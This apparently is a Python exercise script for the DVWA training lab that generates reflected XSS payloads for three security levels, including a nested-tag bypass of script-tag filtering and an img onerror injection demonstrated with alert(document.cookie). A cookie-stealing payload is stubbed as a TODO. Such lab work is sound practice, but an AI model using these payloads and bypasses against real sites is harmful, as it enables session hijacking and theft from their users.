"""
    Cross Site Scripting (XSS) - Reflected
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

def generate_cookie_steal_payload():
    # TODO: Generate payload to steal cookie
    pass
"""
In low security, there isn't any protection, so we can just put our whole JS code in the a script tag
"""
def generate_exploit_low(js_pay):
    pay = "<script>"+js_pay+"</script>"
    return pay
"""
For the medium security, all occurences of <script> will be replaced by nothing, we can bypass that by putting another script tag in the script tag to defeat str.replace
"""
def generate_exploit_med(js_pay):
    pay = "<script>"+js_pay+"</script>"
    pay = pay.replace("<script>", "<scr<script>ipt>")
    return pay
"""
High difficulty : 
Who said that you must use <script> to inject javascript ?
"""
def generate_exploit_high(js_pay):
    pay = "<img src/" # we load an image that doesn't exists
    pay += " onerror=" # thus it will trigger an error and will execute our payload
    pay += js_pay # this payload
    pay += ">" # then we close the <img> tag
    return pay

def main():
    # example : print(generate_exploit_high('alert(document.cookie)'))
    print(generate_exploit_high('alert(document.cookie)'))
    
main()